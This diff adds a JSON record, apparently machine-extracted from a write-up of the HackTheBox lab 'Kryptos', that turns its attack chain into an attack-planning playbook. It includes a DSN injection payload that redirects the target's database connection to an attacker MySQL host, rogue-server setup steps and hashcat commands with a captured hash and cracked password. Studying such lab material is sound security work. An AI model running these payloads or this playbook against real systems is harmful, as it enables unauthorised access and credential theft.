@@ -1,0 +1,915 @@
+{
+  "writeup_id": "Htb_Kryptos",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_crypto_exploitation",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "database_injection_bypass",
+    "privilege_path": "web_to_filesystem_to_root",
+    "attack_complexity": "insane",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "pdo_database_parameter_injection",
+      "encryption_themed_application",
+      "vim_encrypted_files",
+      "weak_rng_api_exploitation"
+    ],
+    "environmental_clues": [
+      "php_cryptor_application",
+      "user_controlled_database_parameter",
+      "localhost_only_api",
+      "ubuntu_apache_stack"
+    ],
+    "similar_scenarios": [
+      "crypto_challenges",
+      "web_crypto_boxes"
+    ],
+    "unique_aspects": [
+      "database_dsn_manipulation",
+      "cryptographic_bypass_chain",
+      "vim_crypt_password_recovery",
+      "python_rng_prediction"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "DSN_injection_auth_bypass",
+        "success_reason": "Application allowed user-controlled database parameter in PDO connection string",
+        "prerequisite_indicators": [
+          "user_controlled_database_parameter",
+          "pdo_connection_visible_in_errors",
+          "external_database_connections_allowed"
+        ],
+        "recognition_patterns": [
+          "db parameter in login forms",
+          "PDOException error codes",
+          "DSN string construction vulnerabilities",
+          "semicolon parameter injection possible"
+        ],
+        "failure_modes": [
+          "input_validation_on_db_parameter",
+          "network_restrictions_prevent_external_connections",
+          "hardcoded_database_configuration"
+        ],
+        "environmental_factors": [
+          "php_pdo_mysql_configuration",
+          "no_input_sanitization",
+          "network_connectivity_to_attacker"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "encryption_oracle_attack",
+        "success_reason": "Application provided encryption service that could be abused to decrypt restricted content",
+        "prerequisite_indicators": [
+          "encryption_decryption_endpoints_available",
+          "user_controlled_encryption_input",
+          "encrypted_content_retrieval_possible"
+        ],
+        "recognition_patterns": [
+          "encrypt.php and decrypt.php endpoints",
+          "aes.php, rc4.php crypto-related files",
+          "ability to encrypt arbitrary content",
+          "encrypted responses from server"
+        ],
+        "failure_modes": [
+          "encryption_keys_rotated_frequently",
+          "input_length_restrictions",
+          "rate_limiting_on_crypto_operations"
+        ],
+        "environmental_factors": [
+          "weak_encryption_implementation",
+          "reused_encryption_keys",
+          "predictable_crypto_parameters"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "45-90 minutes"
+      },
+      {
+        "technique": "sqlite_injection_to_webshell",
+        "success_reason": "SQLite test page allowed injection leading to file write capabilities",
+        "prerequisite_indicators": [
+          "sqlite_test_interfaces_exposed",
+          "file_write_permissions_available",
+          "web_accessible_upload_directory"
+        ],
+        "recognition_patterns": [
+          "sqlite database interfaces",
+          "test or debug pages accessible",
+          "file system write capabilities",
+          "web shell upload possible"
+        ],
+        "failure_modes": [
+          "sqlite_injection_protections",
+          "file_write_restrictions",
+          "web_directory_permissions_locked"
+        ],
+        "environmental_factors": [
+          "development_interfaces_in_production",
+          "insufficient_file_permissions",
+          "debug_functionality_exposed"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "vim_crypt_password_recovery",
+        "success_reason": "Vim-encrypted password backup used weak encryption that could be cracked",
+        "prerequisite_indicators": [
+          "vim_encrypted_files_present",
+          "backup_files_accessible",
+          "weak_vim_encryption_methods"
+        ],
+        "recognition_patterns": [
+          "VimCrypt file headers",
+          "password backup files",
+          "vim encryption artifacts",
+          "crackable encryption methods"
+        ],
+        "failure_modes": [
+          "strong_vim_encryption_used",
+          "backup_files_properly_secured",
+          "complex_encryption_passwords"
+        ],
+        "environmental_factors": [
+          "legacy_vim_encryption",
+          "poor_backup_security",
+          "predictable_password_patterns"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "weak_rng_api_exploitation",
+        "success_reason": "Localhost API used weak random number generator allowing signature forgery",
+        "prerequisite_indicators": [
+          "localhost_only_api_available",
+          "weak_random_number_generation",
+          "signature_verification_bypassable"
+        ],
+        "recognition_patterns": [
+          "predictable_random_sequences",
+          "signature_based_authentication",
+          "localhost_api_endpoints",
+          "python_random_module_usage"
+        ],
+        "failure_modes": [
+          "cryptographically_secure_rng",
+          "proper_signature_verification",
+          "api_access_restrictions"
+        ],
+        "environmental_factors": [
+          "python_weak_random_implementation",
+          "predictable_seed_values",
+          "insufficient_crypto_validation"
+        ],
+        "success_probability": 0.71,
+        "typical_timeframe": "60-120 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "user_controlled_database_parameter",
+        "discovery_method": "login_form_analysis",
+        "why_critical": "Enabled complete authentication bypass via DSN injection",
+        "how_to_recognize": [
+          "db parameter in POST requests",
+          "PDO error messages",
+          "database connection strings exposed"
+        ],
+        "follow_up_actions": [
+          "setup_mysql_server_on_attacker_machine",
+          "configure_bind_address_for_external_connections",
+          "create_authentication_bypass_database"
+        ]
+      },
+      {
+        "discovery": "encryption_oracle_service",
+        "discovery_method": "authenticated_page_enumeration",
+        "why_critical": "Allowed decryption of restricted content and access to hidden functionality",
+        "how_to_recognize": [
+          "encrypt/decrypt endpoints available",
+          "crypto-related php files",
+          "user-controlled encryption input"
+        ],
+        "follow_up_actions": [
+          "analyze_encryption_implementation",
+          "identify_target_encrypted_content",
+          "exploit_encryption_oracle"
+        ]
+      },
+      {
+        "discovery": "sqlite_injection_interface",
+        "discovery_method": "encryption_oracle_content_discovery",
+        "why_critical": "Provided file system write access leading to webshell deployment",
+        "how_to_recognize": [
+          "sqlite test pages",
+          "database query interfaces",
+          "file write capabilities"
+        ],
+        "follow_up_actions": [
+          "test_sqlite_injection_vectors",
+          "identify_web_writable_directories",
+          "deploy_webshell_via_injection"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web",
+        "escalation_method": "dsn_injection_auth_bypass",
+        "why_possible": "Application trusted user-controlled database parameter",
+        "recognition_signs": [
+          "database_parameter_in_forms",
+          "pdo_error_messages",
+          "external_connection_capability"
+        ],
+        "exploitation_path": "DSN injection → MySQL server control → Authentication bypass"
+      },
+      {
+        "privilege_level": "authenticated_web",
+        "escalation_method": "encryption_oracle_to_file_access",
+        "why_possible": "Encryption service could decrypt restricted content revealing hidden interfaces",
+        "recognition_signs": [
+          "encryption_endpoints_available",
+          "oracle_attack_possible",
+          "hidden_content_encrypted"
+        ],
+        "exploitation_path": "Encryption oracle → Hidden content access → SQLite interface → File write"
+      },
+      {
+        "privilege_level": "file_system_access",
+        "escalation_method": "vim_crypt_credential_recovery",
+        "why_possible": "Password backups used weak Vim encryption",
+        "recognition_signs": [
+          "vim_encrypted_files",
+          "backup_file_patterns",
+          "weak_encryption_methods"
+        ],
+        "exploitation_path": "File access → Vim-crypt files → Password cracking → SSH access"
+      },
+      {
+        "privilege_level": "user_shell",
+        "escalation_method": "weak_rng_api_exploitation",
+        "why_possible": "Localhost API used predictable random number generation for signatures",
+        "recognition_signs": [
+          "localhost_api_services",
+          "signature_based_auth",
+          "weak_random_implementation"
+        ],
+        "exploitation_path": "Localhost API → Weak RNG → Signature forgery → Root command execution"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface requires deep web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_brute_force",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known CVEs exist"
+          }
+        ],
+        "success_indicators": [
+          "web_directories_discovered",
+          "login_functionality_found",
+          "parameter_injection_possible"
+        ],
+        "next_decision": "analyze_web_application_logic"
+      },
+      {
+        "step": 2,
+        "situation": "Found login form with user-controllable database parameter",
+        "decision": "Attempt database connection redirection attack",
+        "reasoning": "User-controlled db parameter in PDO connection suggests DSN injection vulnerability",
+        "confidence": 0.85,
+        "prerequisites": [
+          "login_form_identified",
+          "db_parameter_discovered"
+        ],
+        "success_indicators": [
+          "external_connection_attempted",
+          "mysql_handshake_received"
+        ],
+        "failure_fallbacks": [
+          "sql_injection",
+          "credential_brute_force",
+          "session_manipulation"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Successfully redirected database connection to attacker-controlled MySQL",
+        "decision": "Set up rogue MySQL server to capture and replay authentication",
+        "reasoning": "Can intercept credentials and provide controlled authentication responses",
+        "confidence": 0.95,
+        "prerequisites": [
+          "mysql_server_configured",
+          "network_connectivity_confirmed"
+        ],
+        "success_indicators": [
+          "authentication_bypass_achieved",
+          "application_access_granted"
+        ],
+        "failure_fallbacks": [
+          "credential_cracking",
+          "protocol_analysis"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_auth_bypassed": {
+        "action": "enumerate_authenticated_functionality",
+        "tools": [
+          "burp_suite",
+          "gobuster",
+          "manual_testing"
+        ],
+        "next_phase": "find_file_system_access"
+      },
+      "if_encryption_functionality_found": {
+        "action": "analyze_crypto_implementation",
+        "purpose": "find_crypto_weaknesses_for_privilege_escalation",
+        "tools": [
+          "custom_scripts",
+          "crypto_analysis"
+        ]
+      },
+      "if_file_system_access_achieved": {
+        "action": "search_for_credentials_and_configs",
+        "alternatives": [
+          "vim_encrypted_files",
+          "config_backups",
+          "ssh_keys"
+        ],
+        "decision_criteria": "based_on_file_types_discovered"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_user_controlled_database_parameters",
+        "reasoning": "dsn_injection_often_overlooked_but_high_impact",
+        "applicability": "php_applications_with_pdo_connections"
+      },
+      {
+        "rule": "setup_rogue_services_when_connection_redirection_possible",
+        "reasoning": "allows_complete_control_over_authentication_logic",
+        "applicability": "any_redirectable_service_connection"
+      },
+      {
+        "rule": "analyze_crypto_implementations_in_custom_applications",
+        "reasoning": "custom_crypto_often_contains_implementation_flaws",
+        "applicability": "applications_with_encryption_functionality"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Database Connection Hijacking",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "mysql"
+        ],
+        "required_ports": [
+          80,
+          3306
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_database",
+          "user_controlled_database_parameters",
+          "pdo_or_similar_database_abstraction",
+          "external_database_connections_allowed"
+        ],
+        "success_indicators": [
+          "connection_received_on_attacker_port",
+          "database_error_messages_visible",
+          "dsn_parameter_injection_possible"
+        ],
+        "incompatible_with": [
+          "strict_input_validation",
+          "database_connection_whitelist",
+          "network_egress_filtering"
+        ],
+        "confidence_boosters": [
+          "visible_database_parameters_in_forms",
+          "pdo_exception_error_messages",
+          "mysql_default_port_accessible"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Web Directory Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_enabled_or_predictable_paths"
+        ],
+        "success_indicators": [
+          "hidden_directories_discovered",
+          "sensitive_files_accessible",
+          "admin_panels_found"
+        ],
+        "incompatible_with": [
+          "comprehensive_access_controls",
+          "custom_404_handling",
+          "web_application_firewall"
+        ],
+        "confidence_boosters": [
+          "default_web_server_installation",
+          "common_cms_patterns",
+          "development_environments"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-20 minutes"
+      },
+      {
+        "technique": "Encryption Oracle Attack",
+        "mitre_id": "T1552",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "encryption_decryption_functionality_exposed",
+          "user_controlled_ciphertext_input",
+          "oracle_responses_observable"
+        ],
+        "success_indicators": [
+          "different_responses_for_valid_invalid_ciphertext",
+          "encryption_parameters_controllable",
+          "plaintext_recovery_possible"
+        ],
+        "incompatible_with": [
+          "authenticated_encryption_only",
+          "constant_time_operations",
+          "rate_limiting_on_crypto_operations"
+        ],
+        "confidence_boosters": [
+          "crypto_themed_application",
+          "multiple_encryption_algorithms_available",
+          "error_messages_reveal_crypto_details"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "30-120 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application_with_database": {
+        "port_indicators": [
+          80,
+          443,
+          3306,
+          5432,
+          1433
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "mysql",
+          "postgresql",
+          "mssql"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS",
+          "PHP",
+          "MySQL"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "encryption_focused_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "cryptor",
+          "encrypt",
+          "decrypt",
+          "aes",
+          "rc4"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ubuntu_linux": {
+        "port_indicators": [
+          22,
+          80
+        ],
+        "service_indicators": [
+          "ssh",
+          "apache"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "Apache/2.4.29"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "database_connection_hijacking",
+          "when": "user_controlled_db_parameters_detected",
+          "reason": "direct_auth_bypass_possible"
+        },
+        {
+          "attack": "web_directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_attack_surface_and_hidden_functionality"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "encryption_oracle_exploitation",
+          "when": "crypto_functionality_exposed",
+          "reason": "complex_but_high_impact_if_successful"
+        },
+        {
+          "attack": "parameter_injection_testing",
+          "when": "dynamic_parameters_in_forms",
+          "reason": "often_leads_to_injection_vulnerabilities"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Database Connection Hijacking",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "burp_suite",
+            "command_template": "Intercept POST request and modify db parameter",
+            "actual_command": "db=cryptor;host={attacker_ip};port=3306;",
+            "output_pattern": "PDO connection to attacker-controlled database",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "mysql_server",
+            "command_template": "service mysql start && mysql -u root",
+            "actual_command": "GRANT ALL ON cryptor.* TO 'dbuser'@'{target_ip}' IDENTIFIED BY '{cracked_password}';",
+            "success_factors": [
+              "mysql_service_running",
+              "proper_bind_address",
+              "correct_credentials"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "wireshark",
+            "command_template": "Monitor network traffic for MySQL authentication",
+            "actual_command": "Follow TCP stream to extract authentication hash",
+            "output_pattern": "MySQL authentication handshake with salt and hash",
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 11200 {mysql_hash} {wordlist}",
+            "actual_command": "hashcat -m 11200 mysql_manual_hash /usr/share/wordlists/rockyou.txt --force",
+            "success_factors": [
+              "weak_password",
+              "proper_hash_format"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "web_application_with_user_controlled_db_parameter",
+          "pdo_mysql_connection_string_injection",
+          "mysql_server_setup_capability"
+        ],
+        "success_indicators": [
+          "connection_received_on_port_3306",
+          "mysql_authentication_handshake_captured",
+          "successful_login_bypass_achieved"
+        ],
+        "common_failures": [
+          "mysql_bind_address_localhost_only",
+          "incorrect_database_schema",
+          "wrong_authentication_credentials",
+          "missing_required_tables"
+        ],
+        "follow_up_techniques": [
+          "web_application_enumeration",
+          "encrypted_content_analysis",
+          "file_system_access_attempts"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "MySQL Authentication Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "wireshark",
+            "command_template": "Capture MySQL authentication handshake",
+            "actual_command": "Follow TCP stream to extract salt and hash values",
+            "output_pattern": "8-byte and 12-byte salt values plus password hash",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 11200 $mysqlna${salt1}{salt2}*{hash} {wordlist}",
+            "actual_command": "hashcat -m 11200 $mysqlna$645f337d4064586a2e4345712b216148257a5c3c*8a212fa3f25179d5840ac214381327c0855aaacc /usr/share/wordlists/rockyou.txt --force",
+            "success_factors": [
+              "weak_password",
+              "comprehensive_wordlist"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "mysql_authentication_traffic_captured",
+          "proper_hash_format_construction",
+          "hashcat_mysql_mode_support"
+        ],
+        "success_indicators": [
+          "password_successfully_cracked",
+          "plaintext_password_revealed",
+          "authentication_bypass_possible"
+        ],
+        "common_failures": [
+          "strong_password_policy",
+          "incorrect_hash_format",
+          "insufficient_wordlist_coverage"
+        ],
+        "follow_up_techniques": [
+          "database_table_creation",
+          "authentication_bypass_completion",
+          "application_access_escalation"
+        ],
+        "time_investment": "5-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Suite",
+        "use_case": "parameter_injection_and_request_modification",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "manual_curl_requests",
+          "custom_python_scripts"
+        ],
+        "best_practices": [
+          "use_match_and_replace_for_consistent_modifications",
+          "monitor_all_traffic_for_unexpected_behaviors",
+          "validate_injection_success_through_network_monitoring"
+        ]
+      },
+      {
+        "tool": "MySQL Server",
+        "use_case": "malicious_database_hosting",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "database_connection_hijacking"
+        ],
+        "alternatives": [
+          "mariadb",
+          "custom_mysql_server"
+        ],
+        "best_practices": [
+          "configure_bind_address_for_external_connections",
+          "create_matching_database_schema",
+          "use_proper_authentication_credentials",
+          "monitor_connection_attempts_via_logs"
+        ]
+      },
+      {
+        "tool": "Wireshark",
+        "use_case": "mysql_authentication_analysis",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "medium",
+        "essential_for": [
+          "network_protocol_analysis"
+        ],
+        "alternatives": [
+          "tcpdump",
+          "custom_packet_capture"
+        ],
+        "best_practices": [
+          "filter_traffic_by_mysql_port_3306",
+          "follow_tcp_streams_for_complete_handshakes",
+          "extract_salt_and_hash_values_accurately"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "mysql_connection_hijacking_to_auth_bypass",
+        "steps": [
+          {
+            "step": 1,
+            "command": "service mysql start",
+            "purpose": "Start MySQL service on attacker machine",
+            "expected_output": "MySQL service running on port 3306"
+          },
+          {
+            "step": 2,
+            "command": "Edit /etc/mysql/mariadb.conf.d/50-server.cnf bind-address to attacker IP",
+            "purpose": "Allow external connections to MySQL",
+            "expected_output": "MySQL listening on external interface"
+          },
+          {
+            "step": 3,
+            "command": "Burp Match/Replace: db=cryptor to db=cryptor;host=10.10.14.14;port=3306;",
+            "purpose": "Redirect database connection to attacker",
+            "expected_output": "Connection received on port 3306"
+          },
+          {
+            "step": 4,
+            "command": "Wireshark capture and follow TCP stream",
+            "purpose": "Extract MySQL authentication hash",
+            "expected_output": "Salt values and password hash captured"
+          },
+          {
+            "step": 5,
+            "command": "hashcat -m 11200 $mysqlna$[salt1][salt2]*[hash] rockyou.txt --force",
+            "purpose": "Crack MySQL authentication hash",
+            "expected_output": "Password: krypt0n1te"
+          },
+          {
+            "step": 6,
+            "command": "CREATE DATABASE cryptor; CREATE TABLE users; INSERT admin user;",
+            "purpose": "Setup malicious database with valid credentials",
+            "expected_output": "Database ready for authentication bypass"
+          },
+          {
+            "step": 7,
+            "command": "GRANT ALL ON cryptor.* TO 'dbuser'@'10.10.10.129' IDENTIFIED BY 'krypt0n1te';",
+            "purpose": "Grant access to target machine",
+            "expected_output": "Authentication bypass successful"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Kryptos",
+      "difficulty": "Insane",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2019-04-06",
+      "author": "no0ne & Adamm",
+      "estimated_time": "6-8 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "very_high",
+      "skill_level_required": "expert",
+      "primary_attack_vectors": [
+        "cryptographic_attacks",
+        "sql_injection",
+        "api_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "weak_encryption",
+        "sqlite_injection",
+        "weak_rng",
+        "vim_crypt_weakness"
+      ],
+      "environment_type": "custom_web_application",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "cryptanalysis",
+        "custom_encryption_bypass",
+        "rng_exploitation",
+        "vim_crypt_cracking"
+      ],
+      "prerequisite_knowledge": [
+        "advanced_cryptography",
+        "sql_injection",
+        "python_exploitation",
+        "random_number_theory"
+      ]
+    },
+    "categorization": {
+      "primary_category": "cryptography",
+      "subcategories": [
+        "web_exploitation",
+        "privilege_escalation",
+        "cryptanalysis"
+      ],
+      "attack_types": [
+        "encryption_bypass",
+        "sql_injection",
+        "rng_prediction",
+        "file_system_access"
+      ],
+      "defensive_lessons": [
+        "strong_encryption_implementation",
+        "secure_rng",
+        "input_validation",
+        "api_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Crypto",
+        "Cipher",
+        "Obscurity"
+      ],
+      "similarity_reasons": [
+        "cryptographic_challenges",
+        "custom_encryption",
+        "multi_stage_exploitation"
+      ],
+      "unique_aspects": [
+        "vim_crypt_cracking",
+        "rng_prediction",
+        "database_redirection",
+        "layered_crypto_challenges"
+      ],
+      "difficulty_factors": [
+        "complex_cryptanalysis",
+        "multiple_encryption_bypasses",
+        "advanced_math_concepts",
+        "custom_implementations"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T19:04:04.979752",
+    "original_file": "0xdf_writeups/Htb Kryptos.md",
+    "content_length": 49588,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
